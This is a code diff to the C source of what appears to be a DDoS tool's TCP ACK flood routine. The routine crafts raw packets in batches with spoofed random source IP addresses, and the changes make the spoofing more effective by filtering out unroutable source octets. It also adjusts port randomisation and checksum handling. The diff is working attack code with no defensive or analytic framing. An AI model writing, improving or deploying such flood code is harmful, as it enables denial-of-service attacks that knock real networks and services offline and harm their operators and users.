@@ -13,7 +13,6 @@
 #include "ack_attack.h"
 #include "../headers/checksum.h"
 #include "../headers/protocol.h"
-#include "../headers/rand.h"
 
 #define BATCH 128
 
@@ -41,8 +40,7 @@ void* ack_attack(void* arg) {
     int sndbuf = 4 * 1024 * 1024;
     setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
 
-    /* Seed xorshift PRNG */
-    uint64_t rng_state = (uint64_t)time(NULL) ^ ((uint64_t)getpid() << 32);
+    uint64_t rng_state = (uint64_t)time(NULL) ^ ((uint64_t)getpid() << 32) ^ (uintptr_t)&params;
     if (rng_state == 0) rng_state = 0xDEADBEEFCAFEBABEULL;
 
     /* Pre-allocate batch buffers */
@@ -99,14 +97,16 @@ void* ack_attack(void* arg) {
             uint64_t r2 = xorshift64(&rng_state);
             uint64_t r3 = xorshift64(&rng_state);
 
-            ip->saddr    = (uint32_t)(r1);
+            uint32_t sip = (uint32_t)(r1);
+            uint8_t first = (sip >> 24) & 0xFF;
+            if (first == 0 || first >= 224) sip = (((first % 223) + 1) << 24) | (sip & 0x00FFFFFF);
+            ip->saddr    = sip;
             ip->id       = htons((uint16_t)(r1 >> 32));
-            tcp->source  = htons((uint16_t)(1024 + ((uint32_t)(r2) % (65535 - 1024 + 1))));
+            tcp->source  = htons((uint16_t)(1024 + ((uint32_t)(r2) % 64512)));
             tcp->seq     = htonl((uint32_t)(r2 >> 32));
             tcp->ack_seq = htonl((uint32_t)(r3));
 
             ip->check  = 0;
-            ip->check  = generic_checksum(ip, sizeof(struct iphdr));
             tcp->check = 0;
             tcp->check = tcp_udp_checksum(tcp, sizeof(struct tcphdr), ip->saddr, ip->daddr, IPPROTO_TCP);
         }
